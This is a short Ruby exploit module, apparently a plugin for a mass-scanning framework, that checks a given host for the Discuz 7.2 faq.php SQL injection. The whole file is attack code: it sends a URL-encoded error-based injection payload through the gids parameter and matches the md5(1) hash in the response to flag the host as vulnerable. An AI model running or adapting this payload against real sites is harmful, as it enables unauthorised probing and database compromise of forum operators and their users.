
class Exploit_4 < FastExp

  def initialize
    @exp_id = 4
    @exp_name = "Discuz7.2 Sql"
    @exp_type = "HOST"
    @exp_txt = "Discuz7.2 faq.php sql"
    @pattern = /.*c4ca4238a0b923820dcc509a6f75849b1.*/
  end

  def exp(type, arg)
	begin
		return if !type.include?(@exp_type)
    	html = HTTP.get("http://"+arg+"/bbs/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%281%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23").to_s
    	@match = @pattern.match html
    	@found = true if @match != nil
	rescue
		@error = true
		@error_info = "error:#{$!} at:#{$@}"
	end
  end

end

FastCfg+[Exploit_4.new]

